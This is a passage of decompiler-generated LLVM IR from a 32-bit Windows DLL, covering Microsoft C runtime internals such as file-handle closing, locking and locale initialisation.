  %10 = add i32 %0, -4, !insn.addr !9437
  %11 = inttoptr i32 %10 to i32*, !insn.addr !9437
  store i32 0, i32* %11, align 4, !insn.addr !9437
  %12 = add i32 %0, 12, !insn.addr !9438
  %13 = inttoptr i32 %12 to i32*, !insn.addr !9438
  %14 = load i32, i32* %13, align 4, !insn.addr !9438
  %15 = inttoptr i32 %14 to i32*, !insn.addr !9439
  %16 = load i32, i32* %15, align 4, !insn.addr !9439
  %17 = inttoptr i32 %16 to i32*, !insn.addr !9440
  %18 = load i32, i32* %17, align 4, !insn.addr !9440
  %19 = sdiv i32 %18, 64, !insn.addr !9441
  %20 = and i32 %18, 63, !insn.addr !9442
  %narrow = mul nuw nsw i32 %20, 48
  %21 = mul i32 %19, 4, !insn.addr !9443
  %22 = add i32 %21, ptrtoint (i32* @global_var_1003e8e8 to i32), !insn.addr !9443
  %23 = inttoptr i32 %22 to i32*, !insn.addr !9443
  %24 = load i32, i32* %23, align 4, !insn.addr !9443
  %25 = add i32 %24, 40, !insn.addr !9444
  %26 = add i32 %25, %narrow, !insn.addr !9444
  %27 = inttoptr i32 %26 to i8*, !insn.addr !9444
  %28 = load i8, i8* %27, align 1, !insn.addr !9444
  %29 = and i8 %28, 1, !insn.addr !9444
  %30 = icmp eq i8 %29, 0, !insn.addr !9444
  br i1 %30, label %dec_label_pc_1001db91, label %dec_label_pc_1001db86, !insn.addr !9445

dec_label_pc_1001db86:                            ; preds = %dec_label_pc_1001db45
  %31 = call i32 @__close_nolock(i32 %18), !insn.addr !9446
  store i32 %31, i32* %storemerge.reg2mem, !insn.addr !9447
  br label %dec_label_pc_1001db9f, !insn.addr !9447

dec_label_pc_1001db91:                            ; preds = %dec_label_pc_1001db45
  %32 = call i32* @__errno(), !insn.addr !9448
  store i32 9, i32* %32, align 4, !insn.addr !9449
  store i32 -1, i32* %storemerge.reg2mem, !insn.addr !9450
  br label %dec_label_pc_1001db9f, !insn.addr !9450

dec_label_pc_1001db9f:                            ; preds = %dec_label_pc_1001db91, %dec_label_pc_1001db86
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  store i32 %storemerge.reload, i32* %3, align 4, !insn.addr !9451
  store i32 -2, i32* %11, align 4, !insn.addr !9452
  %33 = call i32 @function_1001dbbb(), !insn.addr !9453
  %34 = call i32 @__SEH_epilog4(), !insn.addr !9454
  ret i32 %34, !insn.addr !9455
}

define i32 @function_1001dbbb() local_unnamed_addr {
dec_label_pc_1001dbbb:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 16, !insn.addr !9456
  %2 = inttoptr i32 %1 to i32*, !insn.addr !9456
  %3 = load i32, i32* %2, align 4, !insn.addr !9456
  %4 = inttoptr i32 %3 to i32*, !insn.addr !9457
  %5 = load i32, i32* %4, align 4, !insn.addr !9457
  %6 = call i32 @___acrt_lowio_unlock_fh(i32 %5), !insn.addr !9458
  ret i32 %6, !insn.addr !9459
}

define i32 @"??$__acrt_lowio_lock_fh_and_call@V<lambda_628dfdc04ba53c8bfc02c9951375f3f5>@@@@YAHH$$QAV<lambda_628dfdc04ba53c8bfc02c9951375f3f5>@@@Z"(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_1001dbc7:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = ptrtoint i32* %arg2 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4, !insn.addr !9460
  store i32 %arg1, i32* %stack_var_-16, align 4, !insn.addr !9461
  %2 = call i32 @function_1001db45(i32* nonnull %stack_var_-16, i32 %1, i32* nonnull %stack_var_-12, i32 %arg1, i32 %arg1, i32 %0), !insn.addr !9462
  ret i32 %2, !insn.addr !9463
}

declare i32 @__close_nolock(i32) local_unnamed_addr

declare i32 @___acrt_stdio_free_buffer_nolock(i32) local_unnamed_addr

declare i32 @___acrt_stdio_begin_temporary_buffering_nolock(i32, i32, i32) local_unnamed_addr

declare i32 @___acrt_stdio_end_temporary_buffering_nolock(i8, i32) local_unnamed_addr

define i32 @function_1001eb45(i32* %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1001eb45:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__SEH_prolog4(i32* nonnull @global_var_1003bb88, i32 8), !insn.addr !9464
  %2 = add i32 %0, 8, !insn.addr !9465
  %3 = inttoptr i32 %2 to i32*, !insn.addr !9465
  %4 = load i32, i32* %3, align 4, !insn.addr !9465
  %5 = inttoptr i32 %4 to i32*, !insn.addr !9466
  %6 = load i32, i32* %5, align 4, !insn.addr !9466
  %7 = call i32 @___acrt_lock(i32 %6), !insn.addr !9467
  %8 = add i32 %0, -4, !insn.addr !9468
  %9 = inttoptr i32 %8 to i32*, !insn.addr !9468
  store i32 0, i32* %9, align 4, !insn.addr !9468
  %10 = call i32 @function_1001ec8b(), !insn.addr !9469
  store i32 -2, i32* %9, align 4, !insn.addr !9470
  %11 = call i32 @function_1001eb7c(), !insn.addr !9471
  %12 = call i32 @__SEH_epilog4(), !insn.addr !9472
  ret i32 %12, !insn.addr !9473
}

define i32 @function_1001eb7c() local_unnamed_addr {
dec_label_pc_1001eb7c:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 16, !insn.addr !9474
  %2 = inttoptr i32 %1 to i32*, !insn.addr !9474
  %3 = load i32, i32* %2, align 4, !insn.addr !9474
  %4 = inttoptr i32 %3 to i32*, !insn.addr !9475
  %5 = load i32, i32* %4, align 4, !insn.addr !9475
  %6 = call i32 @___acrt_unlock(i32 %5), !insn.addr !9476
  ret i32 %6, !insn.addr !9477
}

define void @"??$?RV<lambda_38c1253c7a74f5d2d430989951395d98>@@AAV<lambda_b163b37eafe0a13f2c371fafeb0365c9>@@AAV<lambda_8dff2cf36a5417162780cd64fa2883ef>@@@?$__crt_seh_guarded_call@X@@QAEX$$QAV<lambda_38c1253c7a74f5d2d430989951395d98>@@AAV<lambda_b163b37eafe0a13f2c371fafeb0365c9>@@AAV<lambda_8dff2cf36a5417162780cd64fa2883ef>@@@Z"(i32* %arg1, i32* %arg2, i32* %arg3) local_unnamed_addr {
dec_label_pc_1001eb88:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__SEH_prolog4(i32* nonnull @global_var_1003bba8, i32 8), !insn.addr !9478
  %2 = add i32 %0, -4, !insn.addr !9479
  %3 = inttoptr i32 %2 to i32*, !insn.addr !9479
  store i32 0, i32* %3, align 4, !insn.addr !9479
  %4 = call i32 @function_1001ed89(), !insn.addr !9480
  store i32 -2, i32* %3, align 4, !insn.addr !9481
  %5 = call i32 @function_1001ebb4(), !insn.addr !9482
  %6 = call i32 @__SEH_epilog4(), !insn.addr !9483
  ret void, !insn.addr !9484
}

define i32 @function_1001ebb4() local_unnamed_addr {
dec_label_pc_1001ebb4:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 16, !insn.addr !9485
  %2 = inttoptr i32 %1 to i32*, !insn.addr !9485
  %3 = load i32, i32* %2, align 4, !insn.addr !9485
  %4 = inttoptr i32 %3 to i32*, !insn.addr !9486
  %5 = load i32, i32* %4, align 4, !insn.addr !9486
  %6 = inttoptr i32 %5 to i32*, !insn.addr !9487
  %7 = load i32, i32* %6, align 4, !insn.addr !9487
  %8 = add i32 %7, 848, !insn.addr !9488
  %9 = inttoptr i32 %8 to i32*, !insn.addr !9488
  %10 = load i32, i32* %9, align 4, !insn.addr !9488
  %11 = and i32 %10, -17, !insn.addr !9488
  store i32 %11, i32* %9, align 4, !insn.addr !9488
  ret i32 %7, !insn.addr !9489
}

define i32 @function_1001ebc3(i32* %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1001ebc3:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__SEH_prolog4(i32* nonnull @global_var_1003bb68, i32 12), !insn.addr !9490
  %2 = add i32 %0, 8, !insn.addr !9491
  %3 = inttoptr i32 %2 to i32*, !insn.addr !9491
  %4 = load i32, i32* %3, align 4, !insn.addr !9491
  %5 = inttoptr i32 %4 to i32*, !insn.addr !9492
  %6 = load i32, i32* %5, align 4, !insn.addr !9492
  %7 = call i32 @___acrt_lock(i32 %6), !insn.addr !9493
  %8 = add i32 %0, -4, !insn.addr !9494
  %9 = inttoptr i32 %8 to i32*, !insn.addr !9494
  store i32 0, i32* %9, align 4, !insn.addr !9494
  %10 = add i32 %0, -25, !insn.addr !9495
  %11 = call i32 @function_1001ec5c(i32 %10), !insn.addr !9496
  store i32 -2, i32* %9, align 4, !insn.addr !9497
  %12 = call i32 @function_1001ec00(), !insn.addr !9498
  %13 = call i32 @__SEH_epilog4(), !insn.addr !9499
  ret i32 %13, !insn.addr !9500
}

define i32 @function_1001ec00() local_unnamed_addr {
dec_label_pc_1001ec00:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 16, !insn.addr !9501
  %2 = inttoptr i32 %1 to i32*, !insn.addr !9501
  %3 = load i32, i32* %2, align 4, !insn.addr !9501
  %4 = inttoptr i32 %3 to i32*, !insn.addr !9502
  %5 = load i32, i32* %4, align 4, !insn.addr !9502
  %6 = call i32 @___acrt_unlock(i32 %5), !insn.addr !9503
  ret i32 %6, !insn.addr !9504
}

define i32 @function_1001ec0c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1001ec0c:
  %0 = call i32 @__decompiler_undefined_function_1()
  ret i32 %0
}

define i32 @function_1001ec0e(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1001ec0e:
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4, !insn.addr !9505
  store i32 %arg1, i32* %stack_var_-16, align 4, !insn.addr !9506
  %1 = call i32 @function_1001ebc3(i32* nonnull %stack_var_-16, i32 %arg2, i32* nonnull %stack_var_-12, i32 %arg1, i32 %arg1, i32 %0), !insn.addr !9507
  ret i32 %1, !insn.addr !9508
}

define i32 @function_1001ec34(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_1001ec34:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = ptrtoint i32* %arg2 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4, !insn.addr !9509
  store i32 %arg1, i32* %stack_var_-16, align 4, !insn.addr !9510
  %2 = call i32 @function_1001eb45(i32* nonnull %stack_var_-16, i32 %1, i32* nonnull %stack_var_-12, i32 %arg1, i32 %arg1, i32 %0), !insn.addr !9511
  ret i32 %2, !insn.addr !9512
}

define i32 @function_1001ec5c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1001ec5c:
  %eax.1.reg2mem = alloca i32, !insn.addr !9513
  %esi.0.reg2mem = alloca i32, !insn.addr !9513
  %eax.0.reg2mem = alloca i32, !insn.addr !9513
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-12 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !9514
  %2 = add i32 %1, -4
  %3 = inttoptr i32 %2 to i32*
  %4 = add i32 %1, -8
  %5 = inttoptr i32 %4 to i32*
  br label %dec_label_pc_1001ec6f, !insn.addr !9515

dec_label_pc_1001ec6f:                            ; preds = %dec_label_pc_1001ec7e, %dec_label_pc_1001ec5c
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %6 = inttoptr i32 %esi.0.reload to i32*, !insn.addr !9516
  %7 = load i32, i32* %6, align 4, !insn.addr !9516
  %8 = icmp eq i32 %7, ptrtoint (i32** @global_var_1003d320 to i32), !insn.addr !9516
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !9517
  br i1 %8, label %dec_label_pc_1001ec7e, label %dec_label_pc_1001ec73, !insn.addr !9517

dec_label_pc_1001ec73:                            ; preds = %dec_label_pc_1001ec6f
  store i32 ptrtoint (i32** @global_var_1003d320 to i32), i32* %3, align 4, !insn.addr !9518
  store i32 %esi.0.reload, i32* %5, align 4, !insn.addr !9519
  %9 = call i32 @__updatetlocinfoEx_nolock(), !insn.addr !9520
  store i32 %9, i32* %6, align 4, !insn.addr !9521
  store i32 %9, i32* %eax.1.reg2mem, !insn.addr !9521
  br label %dec_label_pc_1001ec7e, !insn.addr !9521

dec_label_pc_1001ec7e:                            ; preds = %dec_label_pc_1001ec73, %dec_label_pc_1001ec6f
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %10 = add i32 %esi.0.reload, 4, !insn.addr !9522
  %11 = icmp eq i32 %esi.0.reload, %0, !insn.addr !9523
  %12 = icmp eq i1 %11, false, !insn.addr !9524
  store i32 %eax.1.reload, i32* %eax.0.reg2mem, !insn.addr !9524
  store i32 %10, i32* %esi.0.reg2mem, !insn.addr !9524
  br i1 %12, label %dec_label_pc_1001ec6f, label %dec_label_pc_1001ec85, !insn.addr !9524

dec_label_pc_1001ec85:                            ; preds = %dec_label_pc_1001ec7e
  ret i32 %eax.1.reload, !insn.addr !9525
}

define i32 @function_1001ec8b() local_unnamed_addr {
dec_label_pc_1001ec8b:
  %eax.1.reg2mem = alloca i32, !insn.addr !9526
  %ecx.0.reg2mem = alloca i32, !insn.addr !9526
  %edx.0.reg2mem = alloca i32, !insn.addr !9526
  %eax.0.reg2mem = alloca i32, !insn.addr !9526
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = add i32 %1, 4, !insn.addr !9527
  %3 = inttoptr i32 %2 to i32*, !insn.addr !9527
  %4 = load i32, i32* %3, align 4, !insn.addr !9527
  %5 = inttoptr i32 %4 to i32*, !insn.addr !9528
  %6 = load i32, i32* %5, align 4, !insn.addr !9528
  %7 = add i32 %6, 76, !insn.addr !9529
  %8 = inttoptr i32 %7 to i32*, !insn.addr !9529
  %9 = load i32, i32* %8, align 4, !insn.addr !9529
  %10 = call i32 @__copytlocinfo_nolock(i32 %1, i32 %9, i32 %0), !insn.addr !9530
  %11 = add i32 %1, 16, !insn.addr !9531
  %12 = inttoptr i32 %11 to i32*, !insn.addr !9531
  %13 = load i32, i32* %12, align 4, !insn.addr !9531
  %14 = inttoptr i32 %13 to i32*, !insn.addr !9532
  %15 = load i32, i32* %14, align 4, !insn.addr !9532
  %16 = add i32 %1, 12, !insn.addr !9533
  %17 = inttoptr i32 %16 to i32*, !insn.addr !9533
  %18 = load i32, i32* %17, align 4, !insn.addr !9533
  %19 = inttoptr i32 %18 to i32*, !insn.addr !9534
  %20 = load i32, i32* %19, align 4, !insn.addr !9534
  %21 = call i32 @__wsetlocale_nolock(i32 %1, i32 %20, i32 %15), !insn.addr !9535
  %22 = add i32 %1, 8, !insn.addr !9536
  %23 = inttoptr i32 %22 to i32*, !insn.addr !9536
  %24 = load i32, i32* %23, align 4, !insn.addr !9536
  %25 = inttoptr i32 %24 to i32*, !insn.addr !9537
  store i32 %21, i32* %25, align 4, !insn.addr !9537
  %26 = icmp eq i32 %21, 0, !insn.addr !9538
  br i1 %26, label %dec_label_pc_1001ed73, label %dec_label_pc_1001ecc4, !insn.addr !9539

dec_label_pc_1001ecc4:                            ; preds = %dec_label_pc_1001ec8b
  %27 = load i32, i32* %12, align 4, !insn.addr !9540
  %28 = inttoptr i32 %27 to i32*, !insn.addr !9541
  %29 = load i32, i32* %28, align 4, !insn.addr !9541
  %30 = icmp eq i32 %29, 0, !insn.addr !9542
  store i32 %29, i32* %eax.0.reg2mem, !insn.addr !9543
  store i32 ptrtoint (i16** @global_var_1003d3e0 to i32), i32* %edx.0.reg2mem, !insn.addr !9543
  store i32 %24, i32* %ecx.0.reg2mem, !insn.addr !9543
  br i1 %30, label %dec_label_pc_1001ed0c, label %dec_label_pc_1001ecd3, !insn.addr !9543

dec_label_pc_1001ecd3:                            ; preds = %dec_label_pc_1001ecc4, %dec_label_pc_1001eced
  %edx.0.reload = load i32, i32* %edx.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %31 = inttoptr i32 %eax.0.reload to i16*, !insn.addr !9544
  %32 = load i16, i16* %31, align 2, !insn.addr !9544
  %33 = inttoptr i32 %edx.0.reload to i16*, !insn.addr !9545
  %34 = load i16, i16* %33, align 4, !insn.addr !9545
  %35 = icmp eq i16 %32, %34, !insn.addr !9545
  %36 = icmp eq i1 %35, false, !insn.addr !9546
  br i1 %36, label %dec_label_pc_1001ed05, label %dec_label_pc_1001ecde, !insn.addr !9546

dec_label_pc_1001ecde:                            ; preds = %dec_label_pc_1001ecd3
  %37 = icmp eq i16 %32, 0, !insn.addr !9547
  store i32 1, i32* %ecx.0.reg2mem, !insn.addr !9548
  br i1 %37, label %dec_label_pc_1001ed0c, label %dec_label_pc_1001ece3, !insn.addr !9548

dec_label_pc_1001ece3:                            ; preds = %dec_label_pc_1001ecde
  %38 = add i32 %eax.0.reload, 2, !insn.addr !9549
  %39 = inttoptr i32 %38 to i16*, !insn.addr !9549
  %40 = load i16, i16* %39, align 2, !insn.addr !9549
  %41 = or i32 %edx.0.reload, 2, !insn.addr !9550
  %42 = inttoptr i32 %41 to i16*, !insn.addr !9550
  %43 = load i16, i16* %42, align 2, !insn.addr !9550
  %44 = icmp eq i16 %40, %43, !insn.addr !9550
  %45 = icmp eq i1 %44, false, !insn.addr !9551
  br i1 %45, label %dec_label_pc_1001ed05, label %dec_label_pc_1001eced, !insn.addr !9551

dec_label_pc_1001eced:                            ; preds = %dec_label_pc_1001ece3
  %46 = add i32 %eax.0.reload, 4, !insn.addr !9552
  %47 = add i32 %edx.0.reload, 4, !insn.addr !9553
  %48 = icmp eq i16 %40, 0, !insn.addr !9554
  %49 = icmp eq i1 %48, false, !insn.addr !9555
  store i32 %46, i32* %eax.0.reg2mem, !insn.addr !9555
  store i32 %47, i32* %edx.0.reg2mem, !insn.addr !9555
  store i32 1, i32* %ecx.0.reg2mem, !insn.addr !9555
  br i1 %49, label %dec_label_pc_1001ecd3, label %dec_label_pc_1001ed0c, !insn.addr !9555

dec_label_pc_1001ed05:                            ; preds = %dec_label_pc_1001ece3, %dec_label_pc_1001ecd3
  %50 = load i32, i32* @global_var_1003eaf8, align 4, !insn.addr !9556
  store i32 1, i32* @global_var_1003eaf8, align 4, !insn.addr !9556
  store i32 %50, i32* %ecx.0.reg2mem, !insn.addr !9556
  br label %dec_label_pc_1001ed0c, !insn.addr !9556

dec_label_pc_1001ed0c:                            ; preds = %dec_label_pc_1001ecde, %dec_label_pc_1001eced, %dec_label_pc_1001ed05, %dec_label_pc_1001ecc4
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %51 = call i32 @__updatetlocinfoEx_nolock(), !insn.addr !9557
  %52 = call i32 @___acrt_release_locale_ref(i32 %ecx.0.reload), !insn.addr !9558
  %53 = load i32, i32* %3, align 4, !insn.addr !9559
  %54 = inttoptr i32 %53 to i32*, !insn.addr !9560
  %55 = load i32, i32* %54, align 4, !insn.addr !9560
  %56 = add i32 %55, 848, !insn.addr !9561
  %57 = inttoptr i32 %56 to i8*, !insn.addr !9561
  %58 = load i8, i8* %57, align 1, !insn.addr !9561
  %59 = and i8 %58, 2, !insn.addr !9561
  %60 = icmp eq i8 %59, 0, !insn.addr !9561
  %61 = icmp eq i1 %60, false, !insn.addr !9562
  store i32 %55, i32* %eax.1.reg2mem, !insn.addr !9562
  br i1 %61, label %dec_label_pc_1001ed87, label %dec_label_pc_1001ed38, !insn.addr !9562

dec_label_pc_1001ed38:                            ; preds = %dec_label_pc_1001ed0c
  %62 = load i8, i8* @global_var_1003d3e4, align 1, !insn.addr !9563
  %63 = and i8 %62, 1, !insn.addr !9563
  %64 = icmp eq i8 %63, 0, !insn.addr !9563
  %65 = icmp eq i1 %64, false, !insn.addr !9564
  store i32 %55, i32* %eax.1.reg2mem, !insn.addr !9564
  br i1 %65, label %dec_label_pc_1001ed87, label %dec_label_pc_1001ed41, !insn.addr !9564

dec_label_pc_1001ed41:                            ; preds = %dec_label_pc_1001ed38
  %66 = call i32 @__updatetlocinfoEx_nolock(), !insn.addr !9565
  %67 = load i32, i32* @global_var_1003eafc, align 4, !insn.addr !9566
  %68 = add i32 %67, 136, !insn.addr !9567
  %69 = inttoptr i32 %68 to i32*, !insn.addr !9567
  %70 = load i32, i32* %69, align 4, !insn.addr !9567
  store i32 %70, i32* inttoptr (i32 268685576 to i32*), align 8, !insn.addr !9568
  %71 = inttoptr i32 %67 to i32*, !insn.addr !9569
  %72 = load i32, i32* %71, align 4, !insn.addr !9569
  store i32 %72, i32* inttoptr (i32 268685768 to i32*), align 8, !insn.addr !9570
  %73 = add i32 %67, 4, !insn.addr !9571
  %74 = inttoptr i32 %73 to i32*, !insn.addr !9571
  %75 = load i32, i32* %74, align 4, !insn.addr !9571
  store i32 %75, i32* @global_var_1003d318, align 4, !insn.addr !9572
  ret i32 %75, !insn.addr !9573

dec_label_pc_1001ed73:                            ; preds = %dec_label_pc_1001ec8b
  %76 = call i32 @___acrt_release_locale_ref(i32 %24), !insn.addr !9574
  %77 = call i32 @___acrt_free_locale(i32 %24), !insn.addr !9575
  store i32 %77, i32* %eax.1.reg2mem, !insn.addr !9576
  br label %dec_label_pc_1001ed87, !insn.addr !9576

dec_label_pc_1001ed87:                            ; preds = %dec_label_pc_1001ed73, %dec_label_pc_1001ed38, %dec_label_pc_1001ed0c
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !9577
}

define i32 @function_1001ed89() local_unnamed_addr {
dec_label_pc_1001ed89:
  %eax.0.reg2mem = alloca i32, !insn.addr !9578
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__calloc_base(), !insn.addr !9579
  %2 = inttoptr i32 %0 to i32*, !insn.addr !9580
  store i32 %1, i32* %2, align 4, !insn.addr !9580
  %3 = call i32 @__free_base(i32 0), !insn.addr !9581
  %4 = icmp eq i32 %1, 0, !insn.addr !9582
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !9583
  br i1 %4, label %dec_label_pc_1001eddf, label %dec_label_pc_1001edb5, !insn.addr !9583

dec_label_pc_1001edb5:                            ; preds = %dec_label_pc_1001ed89
  %5 = call i32 @function_1001ec34(i32 4, i32* nonnull %stack_var_-24), !insn.addr !9584
  store i32 %5, i32* %eax.0.reg2mem, !insn.addr !9585
  br label %dec_label_pc_1001eddf, !insn.addr !9585

dec_label_pc_1001eddf:                            ; preds = %dec_label_pc_1001edb5, %dec_label_pc_1001ed89
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !9586
}

define i32 @___acrt_set_locale_changed() local_unnamed_addr {
dec_label_pc_1001ee4b:
  %0 = load i32, i32* @global_var_1003eaf8, align 4, !insn.addr !9587
  store i32 1, i32* @global_var_1003eaf8, align 4, !insn.addr !9587
  ret i32 %0, !insn.addr !9588
}

define i32 @function_1001ee58() local_unnamed_addr {
dec_label_pc_1001ee58:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-5 = alloca i32, align 4
  %2 = call i32 @function_1001ec0c(i32 4, i32* nonnull %stack_var_-5, i32 %1, i32 %0), !insn.addr !9589
  ret i32 %2, !insn.addr !9590
}

declare i32 @__copytlocinfo_nolock(i32, i32, i32) local_unnamed_addr

declare i32 @__wsetlocale_nolock(i32, i32, i32) local_unnamed_addr

define i32 @function_100206d4() local_unnamed_addr {
dec_label_pc_100206d4:
  %0 = call i32 @function_1002078b(i32 ptrtoint (i32* @1 to i32)), !insn.addr !9591
  ret i32 %0, !insn.addr !9591
}

define i32 @function_100206df(i32* %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_100206df:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__SEH_prolog4(i32* nonnull @global_var_1003bbc8, i32 12), !insn.addr !9592
  %2 = add i32 %0, -28, !insn.addr !9593
  %3 = inttoptr i32 %2 to i32*, !insn.addr !9593
  store i32 0, i32* %3, align 4, !insn.addr !9593
  %4 = add i32 %0, 8, !insn.addr !9594
  %5 = inttoptr i32 %4 to i32*, !insn.addr !9594
  %6 = load i32, i32* %5, align 4, !insn.addr !9594
  %7 = inttoptr i32 %6 to i32*, !insn.addr !9595
  %8 = load i32, i32* %7, align 4, !insn.addr !9595
  %9 = call i32 @___acrt_lock(i32 %8), !insn.addr !9596
  %10 = add i32 %0, -4, !insn.addr !9597
  %11 = inttoptr i32 %10 to i32*, !insn.addr !9597
  store i32 0, i32* %11, align 4, !insn.addr !9597
  %12 = add i32 %0, 12, !insn.addr !9598
  %13 = inttoptr i32 %12 to i32*, !insn.addr !9598
  %14 = load i32, i32* %13, align 4, !insn.addr !9598
  %15 = inttoptr i32 %14 to i32*, !insn.addr !9599
  %16 = load i32, i32* %15, align 4, !insn.addr !9599
  %17 = inttoptr i32 %16 to i32*, !insn.addr !9600
  %18 = load i32, i32* %17, align 4, !insn.addr !9600
  %19 = inttoptr i32 %18 to i32 (i32)*, !insn.addr !9600
  %20 = call i32 @"??$__crt_fast_encode_pointer@P6AHI@Z@@YAP6AHI@ZQ6AHI@Z@Z"(i32 (i32)* %19), !insn.addr !9601
  store i32 %20, i32* @global_var_1003ebd8, align 4, !insn.addr !9602
  %21 = call i1 @EnumSystemLocalesW(i1 (i16*)* inttoptr (i32 268568274 to i1 (i16*)*), i32 1), !insn.addr !9603
  %22 = sext i1 %21 to i32, !insn.addr !9603
  %23 = load i32, i32* @global_var_1003d070, align 4, !insn.addr !9604
  store i32 %23, i32* @global_var_1003ebd8, align 4, !insn.addr !9605
  store i32 %22, i32* %3, align 4, !insn.addr !9606
  store i32 -2, i32* %11, align 4, !insn.addr !9607
  %24 = call i32 @function_10020757(), !insn.addr !9608
  %25 = call i32 @__SEH_epilog4(), !insn.addr !9609
  ret i32 %25, !insn.addr !9610
}

define i32 @function_10020757() local_unnamed_addr {
dec_label_pc_10020757:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 16, !insn.addr !9611
  %2 = inttoptr i32 %1 to i32*, !insn.addr !9611
  %3 = load i32, i32* %2, align 4, !insn.addr !9611
  %4 = inttoptr i32 %3 to i32*, !insn.addr !9612
  %5 = load i32, i32* %4, align 4, !insn.addr !9612
  %6 = call i32 @___acrt_unlock(i32 %5), !insn.addr !9613
  ret i32 %6, !insn.addr !9614
}

define i32 @"??$__acrt_lock_and_call@V<lambda_1f3ce6bd48e0aa2e72a71c02eee379d3>@@@@YAHW4__acrt_lock_id@@$$QAV<lambda_1f3ce6bd48e0aa2e72a71c02eee379d3>@@@Z"(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10020763:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = ptrtoint i32* %arg2 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4, !insn.addr !9615
  store i32 %arg1, i32* %stack_var_-16, align 4, !insn.addr !9616
  %2 = call i32 @function_100206df(i32* nonnull %stack_var_-16, i32 %1, i32* nonnull %stack_var_-12, i32 %arg1, i32 %arg1, i32 %0), !insn.addr !9617
  ret i32 %2, !insn.addr !9618
}

define i32 @function_1002078b(i32 %arg1) local_unnamed_addr {
dec_label_pc_1002078b:
  %0 = call i32 @function_10004670(), !insn.addr !9619
  %1 = call i32 @"@__security_check_cookie@4"(), !insn.addr !9620
  ret i32 %1, !insn.addr !9621
}

declare i32 @"?try_get_AreFileApisANSI@@YAP6GHXZXZ"() local_unnamed_addr

declare i32 @"?try_get_CompareStringEx@@YAP6GHPB_WK0H0HPAU_nlsversioninfo@@PAXJ@ZXZ"() local_unnamed_addr

declare i32 @"?try_get_EnumSystemLocalesEx@@YAP6GHP6GHPA_WKJ@ZKJPAX@ZXZ"() local_unnamed_addr

declare i32 @"?try_get_GetDateFormatEx@@YAP6GHPB_WKPBU_SYSTEMTIME@@0PA_WH0@ZXZ"() local_unnamed_addr

declare i32 @"?try_get_GetLocaleInfoEx@@YAP6GHPB_WKPA_WH@ZXZ"() local_unnamed_addr

declare i32 @"?try_get_GetTimeFormatEx@@YAP6GHPB_WKPBU_SYSTEMTIME@@0PA_WH@ZXZ"() local_unnamed_addr

declare i32 @"?try_get_GetUserDefaultLocaleName@@YAP6GHPA_WH@ZXZ"() local_unnamed_addr

declare i32 @"?try_get_IsValidLocaleName@@YAP6GHPB_W@ZXZ"() local_unnamed_addr

declare i32 @"?try_get_LCIDToLocaleName@@YAP6GHKPA_WHK@ZXZ"() local_unnamed_addr

declare i32 @"?try_get_LCMapStringEx@@YAP6GHPB_WK0HPA_WHPAU_nlsversioninfo@@PAXJ@ZXZ"() local_unnamed_addr

declare i32 @"?try_get_LocaleNameToLCID@@YAP6GKPB_WK@ZXZ"() local_unnamed_addr

define i32 @___acrt_can_use_vista_locale_apis() local_unnamed_addr {
dec_label_pc_10020f5e:
  %0 = call i32 @"?try_get_CompareStringEx@@YAP6GHPB_WK0H0HPAU_nlsversioninfo@@PAXJ@ZXZ"(), !insn.addr !9622
  %1 = icmp ne i32 %0, 0, !insn.addr !9623
  %2 = zext i1 %1 to i32, !insn.addr !9624
  ret i32 %2, !insn.addr !9625
}

